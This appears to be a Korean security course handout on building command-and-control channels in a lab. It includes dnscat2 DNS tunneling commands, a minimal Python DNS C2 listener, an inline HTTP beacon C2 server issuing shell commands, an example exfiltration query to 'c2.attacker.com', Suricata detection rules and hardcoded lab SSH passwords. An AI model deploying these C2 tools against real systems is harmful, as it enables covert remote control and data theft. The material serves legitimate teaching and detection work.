# Week 03: C2 채널 구축 — DNS Tunneling, HTTP C2, 은닉 통신

## 학습 목표
- Command & Control(C2) 인프라의 아키텍처와 역할을 이해한다
- DNS Tunneling을 통한 은닉 C2 채널을 구축하고 탐지할 수 있다
- HTTP/HTTPS 기반 C2 통신의 구현 원리를 실습한다
- C2 트래픽의 네트워크 특성을 분석하여 탐지 규칙을 작성할 수 있다
- OpsClaw를 활용한 C2 통신 모니터링 파이프라인을 구성한다

## 선수 지식
- 공방전 기초 과정 이수
- Week 02 다단계 침투 이해
- DNS 프로토콜 기본 구조, HTTP 프로토콜 이해

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | C2 서버 역할 | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 네트워크 트래픽 분석 | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 감염 호스트 역할 | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 로그 분석 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | C2 인프라 이론 | 강의 |
| 0:35-1:10 | DNS Tunneling 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | HTTP C2 구축 실습 | 실습 |
| 2:00-2:40 | C2 트래픽 탐지 실습 | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:30 | 은닉 기법 토론 + 퀴즈 | 토론 |

---

# Part 1: C2 인프라 이론 (35분)

## 1.1 C2란 무엇인가?

C2(Command & Control)는 공격자가 침투한 시스템을 **원격으로 제어**하기 위한 통신 인프라이다. ATT&CK에서는 TA0011 전술로 분류한다.

```
[공격자] ←→ [C2 서버] ←→ [리다이렉터] ←→ [감염 호스트]
                                ↑
                          방어자 시야 한계선
```

## 1.2 C2 채널 유형

| 프로토콜 | ATT&CK | 은닉성 | 대역폭 | 탐지 난이도 |
|----------|--------|--------|--------|------------|
| HTTP/S | T1071.001 | 중 | 높음 | 중 |
| DNS | T1071.004 | 상 | 낮음 | 상 |
| ICMP | T1095 | 중 | 매우 낮음 | 중 |
| WebSocket | T1071.001 | 중상 | 높음 | 상 |
| DoH (DNS over HTTPS) | T1572 | 최상 | 낮음 | 최상 |

## 1.3 C2 프레임워크 비교

| 프레임워크 | 언어 | C2 채널 | 라이선스 |
|-----------|------|---------|---------|
| Sliver | Go | mTLS, HTTP, DNS, WG | 오픈소스 |
| Cobalt Strike | Java | HTTP, DNS, SMB | 상용 |
| Metasploit | Ruby | TCP, HTTP, HTTPS | 오픈소스 |
| Havoc | C/C++ | HTTP, SMB | 오픈소스 |

---

# Part 2: DNS Tunneling 실습 (35분)

## 2.1 DNS Tunneling 원리

DNS 쿼리의 서브도메인에 데이터를 인코딩하여 방화벽을 우회한다.

```
감염 호스트 → DNS 쿼리: aGVsbG8=.c2.attacker.com
                          ^^^^^^^^ Base64 인코딩된 데이터
DNS 서버 → TXT 응답: "Y29tbWFuZA==" (Base64 인코딩된 명령)
```

## 실습 2.1: dnscat2를 이용한 DNS C2

> **목적**: DNS 프로토콜을 통해 은닉 C2 채널을 구축한다
> **배우는 것**: DNS 터널링 원리, 패킷 분석

```bash
# C2 서버 (opsclaw): dnscat2 서버 시작
dnscat2-server --dns "domain=c2lab.local,host=10.20.30.201" --no-cache

# 감염 호스트 (web): dnscat2 클라이언트 연결
./dnscat --dns "server=10.20.30.201,domain=c2lab.local"

# 네트워크 분석 (secu): DNS 트래픽 캡처
tcpdump -i eth0 -n port 53 -w /tmp/dns_c2.pcap
tshark -r /tmp/dns_c2.pcap -Y "dns" -T fields -e dns.qry.name | head -20
```

## 실습 2.2: 간이 DNS C2 구현 (Python)

> **목적**: DNS C2의 내부 동작을 직접 구현하여 이해한다
> **배우는 것**: DNS 패킷 구조, 인코딩 기법

```python
# dns_c2_server.py (교육용 간이 구현)
import socket, base64

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 5353))

while True:
    data, addr = sock.recvfrom(512)
    # DNS 쿼리에서 서브도메인 추출
    query = data[12:].split(b'\x00')[0]
    subdomain = query.split(b'\x03')[1].decode(errors='ignore')
    decoded = base64.b64decode(subdomain + '==').decode(errors='ignore')
    print(f"[수신] {addr}: {decoded}")
```

---

# Part 3: HTTP C2 구축 (40분)

## 실습 3.1: 간이 HTTP C2 서버

> **목적**: HTTP 프로토콜 기반 C2 통신을 구현한다
> **배우는 것**: Beacon 패턴, Jitter, 프로파일링

```bash
# 간이 C2 서버 (opsclaw)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, time

commands = ['whoami', 'id', 'uname -a']

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/beacon' in self.path:
            cmd = commands.pop(0) if commands else 'sleep'
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({'cmd': cmd}).encode())
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print(f'[결과] {body.decode()}')
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), C2Handler).serve_forever()
"
```

---

# Part 4: C2 탐지 및 방어 (40분)

## 4.1 DNS Tunneling 탐지 지표

| 지표 | 정상 DNS | DNS 터널 |
|------|---------|---------|
| 쿼리 길이 | 15-30자 | 50-200자 |
| 서브도메인 엔트로피 | 낮음 | 높음 (Base64) |
| TXT 레코드 빈도 | 드뭄 | 빈번 |
| 단일 도메인 쿼리 수 | 분산 | 집중 |

```bash
# Suricata DNS 터널 탐지 규칙
cat >> /tmp/dns_tunnel.rules << 'EOF'
alert dns any any -> any any (msg:"DNS Tunnel - Long Query"; dns.query; content:"."; offset:50; sid:1000001; rev:1;)
alert dns any any -> any any (msg:"DNS Tunnel - High TXT frequency"; dns.query; dns_query; pcre:"/^[a-zA-Z0-9+\/=]{30,}/"; sid:1000002; rev:1;)
EOF

# OpsClaw로 DNS 이상 탐지 태스크 실행
curl -X POST http://localhost:8000/projects/{id}/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{"command":"tshark -r /tmp/dns_c2.pcap -Y dns -T fields -e dns.qry.name | awk \"{print length}\" | sort -n | tail","subagent_url":"http://10.20.30.1:8002"}'
```

---

## 검증 체크리스트
- [ ] DNS Tunneling의 원리를 설명하고 간이 구현체를 작성할 수 있다
- [ ] HTTP C2 Beacon 패턴을 이해하고 탐지 포인트를 식별할 수 있다
- [ ] DNS 쿼리 길이/엔트로피 분석으로 터널링을 탐지할 수 있다
- [ ] Suricata 규칙으로 C2 트래픽을 탐지할 수 있다
- [ ] C2 통신의 은닉성을 높이는 기법 3가지를 나열할 수 있다

## 자가 점검 퀴즈
1. DNS Tunneling이 방화벽을 우회할 수 있는 이유를 네트워크 아키텍처 관점에서 설명하시오.
2. HTTP C2에서 Jitter란 무엇이며, 왜 사용하는가?
3. DoH(DNS over HTTPS)를 이용한 C2가 기존 DNS 터널보다 탐지하기 어려운 이유는?
4. C2 트래픽에서 Beacon Interval이 짧을수록 좋은가? 트레이드오프를 설명하시오.
5. 조직 내에서 DNS Tunneling을 탐지하기 위한 모니터링 전략 3가지를 제시하시오.
